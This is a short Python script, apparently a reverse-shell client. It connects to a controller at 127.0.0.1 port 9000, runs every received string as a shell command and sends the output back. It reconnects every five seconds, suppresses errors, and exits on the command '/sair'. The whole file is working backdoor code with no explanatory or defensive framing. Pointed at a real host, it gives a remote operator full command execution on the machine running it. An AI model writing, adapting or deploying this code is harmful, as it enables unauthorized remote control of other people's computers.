import subprocess
import socket
import threading
import time

ip = '127.0.0.1'
port = 9000

class Client:
    def __init__(self):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((ip, port))

    def send_message(self, msg):
        input_data = msg.encode()
        self.client.send(input_data)

    def execute_command(self, data):
        try:
            output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT, timeout=5)
            self.client.send(output + b'\n')
        except subprocess.CalledProcessError as e:
            error_output = e.output
            self.client.send(error_output + b'\n')
        except Exception as e:
            pass

    def listen(self):
        while True:
            data = self.client.recv(1024).decode().strip()
            if data == '/sair':
                return
            else:
                threading.Thread(target=self.execute_command, args=(data,)).start()


if __name__ == '__main__':
    while True:
        try:
            client = Client()
            client.listen()
        except ConnectionRefusedError:
            time.sleep(5)
        except Exception as e:
            pass
